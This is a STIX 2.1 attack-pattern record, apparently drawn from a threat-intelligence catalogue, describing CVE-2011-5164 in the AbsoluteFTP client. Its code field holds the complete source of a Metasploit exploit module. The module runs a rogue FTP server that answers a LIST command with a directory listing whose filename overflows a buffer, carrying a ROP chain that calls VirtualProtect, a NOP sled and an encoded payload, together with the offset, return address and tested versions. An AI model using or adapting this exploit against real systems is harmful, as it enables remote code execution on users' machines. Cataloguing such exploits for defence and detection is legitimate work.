{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9b5f27b2-59c2-4481-b9bf-5f2595aac40e",
    "created": "2024-08-14T16:51:14.653864Z",
    "modified": "2024-08-14T16:51:14.653868Z",
    "name": "AbsoluteFTP 1.9.6 - 2.2.10 LIST Command Remote Buffer Overflow",
    "description": " This module exploits VanDyke Software AbsoluteFTP by overflowing a filename buffer related to the LIST command.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/absolute_ftp_list_bof.rb",
            "external_id": "absolute_ftp_list_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5164"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::FtpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AbsoluteFTP 1.9.6 - 2.2.10 LIST Command Remote Buffer Overflow',\n      'Description'    => %q{\n        This module exploits VanDyke Software AbsoluteFTP by overflowing\n        a filename buffer related to the LIST command.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Node', # Original discovery, MSF module, ROP code\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-5164' ],\n          [ 'OSVDB', '77105' ],\n          [ 'EDB', '18102' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0d\\x5c\\x2f\\x0a\",\n        },\n      'Targets'        =>\n        [\n          [\n            'WinXP SP2 - Windows 7 SP1 / AbsoluteFTP 1.9.6 - 2.2.10.252',\n            {\n              'Ret'    => 0x5f479005,\n              'Offset' => 3336\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-11-09',\n      'DefaultTarget'  => 0))\n  end\n\n  #copypasted from ScriptFTP exploit\n  def on_client_unknown_command(c,cmd,arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n  def on_client_command_list(c,arg)\n\n    conn = establish_data_connection(c)\n    if(not conn)\n      c.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n\n    print_status(\" - Data connection set up\")\n    code = 150\n    c.put(\"#{code} Here comes the directory listing.\\r\\n\")\n\n    code = 226\n    c.put(\"#{code} Directory send ok.\\r\\n\")\n\n  rop_gadgets =\n    [\n      0x5f46a206,  # POP EAX # RETN (MFC42.DLL)\n      0x5f49b260,  # <- *&VirtualProtect()\n      0x5f413fa0,  # MOV EAX,DWORD PTR DS:[EAX] # RETN 04    ** [MFC42.DLL]\n      0x5f418d93,  # PUSH EAX # ADD AL,5F # POP ESI # POP EBX # RETN    ** [MFC42.DLL]\n      0x90909090,  # NOPS (RETN 4)\n      0x90909090,  # NOPS (-> ebx)\n      0x5f432001,  # POP EBP # RETN (MFC42.DLL)\n      0x5F4774D5,  # ptr to 'jmp esp' (from MFC42.DLL)\n      0x5f46a206,  # POP EAX # RETN (MFC42.DLL)\n      0xfffffdff,  # value to negate, target value : 0x00000201, target reg : ebx #<--ADJUST ME FOR BIGGER PAYLOAD\n      0x5f46f6dd,  # NEG EAX # RETN (MFC42.DLL)\n      0x5f47909a,  # XCHG EAX,EBX # DEC EDX # POP EDI # RETN (MFC42.DLL)\n      0x90909090,  # NOPS (-> edi)\n      0x5f498456,  # POP ECX # RETN (MFC42.DLL)\n      0x5F4D1115,  # RW pointer (lpOldProtect) (-> ecx) !!!\n      0x5f46a206,  # POP EAX # RETN (MFC42.DLL)\n      0xffffffc0,  # value to negate, target value : 0x00000040, target reg : edx\n      0x5f46f6dd,  # NEG EAX # RETN (MFC42.DLL)\n      0x5f4892df,  # XCHG EAX,EDX # DEC EAX # POP EDI # RETN (MFC42.DLL)\n      0x5f479005,  # ROP NOP (-> edi)\n      0x5f46a206,  # POP EAX # RETN (MFC42.DLL)\n      0x90909090,  # NOPS (-> eax)\n      0x5f4755b8,  # PUSHAD # RETN (MFC42.DLL)\n    ].pack(\"V*\")\n\n    buffer = [0x5f479005].pack(\"V*\")*848 #ROP NOP's\n    buffer << rop_gadgets\n    buffer << \"\\x90\"*30\n    buffer << payload.encoded\n\n    #copypasted from ScriptFTP exploit\n    print_status(\" - Sending directory list via data connection\")\n    dirlist =  \"-rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 #{buffer}.txt\\r\\n\"\n    dirlist << \"   5 ftpuser  ftpusers       512 Jul 26  2001 A\\r\\n\"\n    dirlist << \"rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 #{buffer}.txt\\r\\n\"\n\n    conn.put(dirlist)\n    conn.close\n    return\n  end\nend\n\n=begin\nExploit has been tested to work on:\n\nAbsoluteFTP 2.2.10 (build 252)\nAbsoluteFTP 2.2.9 (build 248)\nAbsoluteFTP 2.2.8 (build 241)\nAbsoluteFTP 2.2.7 (build 238)\nAbsoluteFTP 2.2.6 (build 230)\nAbsoluteFTP 2.2.5 (build 225)\nAbsoluteFTP 2.2.4 (build 216)\nAbsoluteFTP 2.2.3 (build 210)\nAbsoluteFTP 2.2.2 (build 203)\nAbsoluteFTP 2.2 (build 197)\nAbsoluteFTP 2.2 (build 291)\nAbsoluteFTP 2.2B3 (build 163)\nAbsoluteFTP 2.2B2 (build 158)\nAbsoluteFTP 2.2B1 (build 144)\nAbsoluteFTP 2.0.5 (build 297)\nAbsoluteFTP 2.0.4 (build 293)\nAbsoluteFTP 2.0.3 (build 289)\nAbsoluteFTP 1.9.6\n\nDoes not work on:\nAbsoluteFTP 1.8\n=end\n",
    "x_mitre_disclosure_date": "2011-11-09",
    "x_mitre_platforms": [
        "win'"
    ]
}